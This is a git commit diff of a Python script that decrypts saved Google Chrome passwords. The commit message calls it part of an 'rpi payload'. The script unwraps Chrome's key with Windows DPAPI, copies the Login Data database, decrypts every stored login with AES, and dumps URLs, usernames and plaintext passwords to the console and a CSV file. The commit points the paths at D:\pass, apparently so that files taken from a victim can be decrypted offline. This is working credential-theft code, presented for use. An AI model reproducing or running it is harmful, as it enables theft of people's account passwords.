02ad93b7a84a80ed11b402ee808b6ec44067c448
matan kabalo <matanton666@gmail.com>
2023-06-13 02:12:53 +0300

    added initial changes with the rpi payload that works most of the times

--- decrypt_chrome_password.py
+++ decrypt_chrome_password.py
@@ -1,29 +1,33 @@
 #Full Credits to LimerBoy
-import os
-import re
-import sys
-import json
-import base64
-import sqlite3
-import win32crypt
+from os import environ
+from os.path import normpath
+from json import loads
+from base64 import b64decode
+from win32crypt import CryptUnprotectData
+from shutil import copy2
+from sqlite3 import connect
+from csv import writer
+from os import listdir, remove
+from re import search
 from Cryptodome.Cipher import AES
-import shutil
-import csv
 
 #GLOBAL CONSTANT
-CHROME_PATH_LOCAL_STATE = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(os.environ['USERPROFILE']))
-CHROME_PATH = os.path.normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(os.environ['USERPROFILE']))
+#CHROME_PATH_LOCAL_STATE = normpath(r"%s\AppData\Local\Google\Chrome\User Data\Local State"%(environ['USERPROFILE']))
+#CHROME_PATH = normpath(r"%s\AppData\Local\Google\Chrome\User Data"%(environ['USERPROFILE']))
+
+CHROME_PATH_LOCAL_STATE = normpath(r"D:\pass\LocalState")
+CHROME_PATH = normpath(r"D:\pass")
 
 def get_secret_key():
     try:
         #(1) Get secretkey from chrome local state
         with open( CHROME_PATH_LOCAL_STATE, "r", encoding='utf-8') as f:
             local_state = f.read()
-            local_state = json.loads(local_state)
-        secret_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            local_state = loads(local_state)
+        secret_key = b64decode(local_state["os_crypt"]["encrypted_key"])
         #Remove suffix DPAPI
         secret_key = secret_key[5:] 
-        secret_key = win32crypt.CryptUnprotectData(secret_key, None, None, None, 0)[1]
+        secret_key = CryptUnprotectData(secret_key, None, None, None, 0)[1]
         return secret_key
     except Exception as e:
         print("%s"%str(e))
@@ -56,8 +60,8 @@ def decrypt_password(ciphertext, secret_key):
 def get_db_connection(chrome_path_login_db):
     try:
         print(chrome_path_login_db)
-        shutil.copy2(chrome_path_login_db, "Loginvault.db") 
-        return sqlite3.connect("Loginvault.db")
+        copy2(chrome_path_login_db, "Loginvault.db") 
+        return connect("Loginvault.db")
     except Exception as e:
         print("%s"%str(e))
         print("[ERR] Chrome database cannot be found")
@@ -67,37 +71,35 @@ if __name__ == '__main__':
     try:
         #Create Dataframe to store passwords
         with open('decrypted_password.csv', mode='w', newline='', encoding='utf-8') as decrypt_password_file:
-            csv_writer = csv.writer(decrypt_password_file, delimiter=',')
+            csv_writer = writer(decrypt_password_file, delimiter=',')
             csv_writer.writerow(["index","url","username","password"])
             #(1) Get secret key
             secret_key = get_secret_key()
             #Search user profile or default folder (this is where the encrypted login password is stored)
-            folders = [element for element in os.listdir(CHROME_PATH) if re.search("^Profile*|^Default$",element)!=None]
-            for folder in folders:
-            	#(2) Get ciphertext from sqlite database
-                chrome_path_login_db = os.path.normpath(r"%s\%s\Login Data"%(CHROME_PATH,folder))
-                conn = get_db_connection(chrome_path_login_db)
-                if(secret_key and conn):
-                    cursor = conn.cursor()
-                    cursor.execute("SELECT action_url, username_value, password_value FROM logins")
-                    for index,login in enumerate(cursor.fetchall()):
-                        url = login[0]
-                        username = login[1]
-                        ciphertext = login[2]
-                        if(url!="" and username!="" and ciphertext!=""):
-                            #(3) Filter the initialisation vector & encrypted password from ciphertext 
-                            #(4) Use AES algorithm to decrypt the password
-                            decrypted_password = decrypt_password(ciphertext, secret_key)
-                            print("Sequence: %d"%(index))
-                            print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
-                            print("*"*50)
-                            #(5) Save into CSV 
-                            csv_writer.writerow([index,url,username,decrypted_password])
-                    #Close database connection
-                    cursor.close()
-                    conn.close()
-                    #Delete temp login db
-                    os.remove("Loginvault.db")
+            #(2) Get ciphertext from sqlite database
+            chrome_path_login_db = normpath(r"%s\LoginData"%(CHROME_PATH))
+            conn = get_db_connection(chrome_path_login_db)
+            if(secret_key and conn):
+                cursor = conn.cursor()
+                cursor.execute("SELECT action_url, username_value, password_value FROM logins")
+                for index,login in enumerate(cursor.fetchall()):
+                    url = login[0]
+                    username = login[1]
+                    ciphertext = login[2]
+                    if(url!="" and username!="" and ciphertext!=""):
+                        #(3) Filter the initialisation vector & encrypted password from ciphertext 
+                        #(4) Use AES algorithm to decrypt the password
+                        decrypted_password = decrypt_password(ciphertext, secret_key)
+                        print("Sequence: %d"%(index))
+                        print("URL: %s\nUser Name: %s\nPassword: %s\n"%(url,username,decrypted_password))
+                        print("*"*50)
+                        #(5) Save into CSV 
+                        csv_writer.writerow([index,url,username,decrypted_password])
+                #Close database connection
+                cursor.close()
+                conn.close()
+                #Delete temp login db
+                remove("Loginvault.db")
     except Exception as e:
         print("[ERR] "%str(e))
         
